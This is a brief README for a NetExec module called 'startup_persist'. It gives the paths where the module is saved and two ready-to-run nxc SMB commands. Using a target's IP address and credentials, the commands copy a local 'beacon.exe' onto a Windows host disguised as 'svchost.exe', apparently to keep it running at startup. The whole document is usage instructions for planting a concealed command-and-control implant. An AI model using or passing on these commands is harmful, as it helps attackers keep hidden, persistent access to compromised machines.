# NXC-Extension

## Staging
```
Save Python script to:
/home/kali/.nxc/modules/startup_persist.py
/usr/lib/python3/dist-packages/NetExec/nxc/modules/startup_persist.py

```

## Execution
```
nxc smb $IP -u '$username' -p '$password' -M startup_persist -o FILEPATH=/home/kali/Desktop/beacon.exe FILENAME=svchost.exe
  or
nxc smb $IP -u '$username' -p '$password' -M startup_persist -o FILEPATH=/home/kali/Desktop/beacon.exe FILENAME=svchost.exe USER=$user
```

![nxcpic](https://github.com/user-attachments/assets/c474d207-aa78-426b-8292-e077f10e549d)


### Video
https://vimeo.com/1076489136
